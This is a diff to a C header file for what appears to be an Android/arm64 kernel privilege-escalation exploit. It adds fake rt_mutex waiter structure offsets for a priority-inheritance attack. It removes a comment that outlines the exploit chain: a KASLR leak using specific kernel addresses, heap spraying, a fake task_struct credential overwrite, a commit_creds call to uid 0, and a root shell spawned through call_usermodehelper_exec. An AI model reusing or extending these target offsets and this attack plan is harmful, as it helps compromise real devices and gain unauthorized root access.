@@ -111,6 +111,19 @@
 #define FAKE_TASK_TASK_GROUP_OFF   0x348UL
 
 /* ============================================================================
+ * FAKE WAITER STRUCTURE OFFSETS (Priority Inheritance)
+ * ============================================================================ */
+
+#define FAKE_WAITER_WAKE_STATE_OFF        0x20UL
+#define FAKE_WAITER_TASK_OFF              0x28UL
+#define FAKE_WAITER_LOCK_OFF              0x30UL
+#define FAKE_WAITER_TREE_PRIO_OFF         0x50UL
+#define FAKE_WAITER_TREE_DEADLINE_OFF     0x58UL
+#define FAKE_WAITER_PI_TREE_ENTRY_OFF     0x60UL
+#define FAKE_WAITER_PI_TREE_PRIO_OFF      0x74UL
+#define FAKE_WAITER_PI_TREE_DEADLINE_OFF  0x7cUL
+
+/* ============================================================================
  * PIPE BUFFER CONFIGURATION
  * ============================================================================ */
 
@@ -169,34 +182,5 @@
 #define RECLAIM_METHOD                            "legacy"
 #define FOPS_METHOD                               "bank"
 #define PIPE_METHOD                               "before-fops"
-
-/* ============================================================================
- * EXPLOIT CHAIN FLOW
- * ============================================================================ */
-
-/* 
- * 1. KASLR Leak (one of three methods):
- *    - Try TRACEFS first (0x08308c30 = init_tracer_tracefs)
- *    - Fallback to PSELECT (0x08583390 = __arm64_sys_pselect6)
- *    - Fallback to ASHMEM/FOPS (0x0918e290 = ashmem_ioctl)
- *
- * 2. Memory Shaping:
- *    - Allocate SKB buffer (pipe)
- *    - Spray order-3 pages
- *    - Create slab fragmentation
- *
- * 3. Controlled Memory Write:
- *    - Use ashmem_ioctl or generic_file_splice_read
- *    - Write fake task_struct (0x900 offset)
- *    - Overwrite credentials
- *
- * 4. Privilege Escalation:
- *    - Call commit_creds(0x0818b654)
- *    - Set uid=0, gid=0
- *
- * 5. Root Shell:
- *    - Call call_usermodehelper_exec(0x0816f500)
- *    - Execute /system/bin/sh with uid=0
- */
 
 #endif /* __TARGET_H__ */
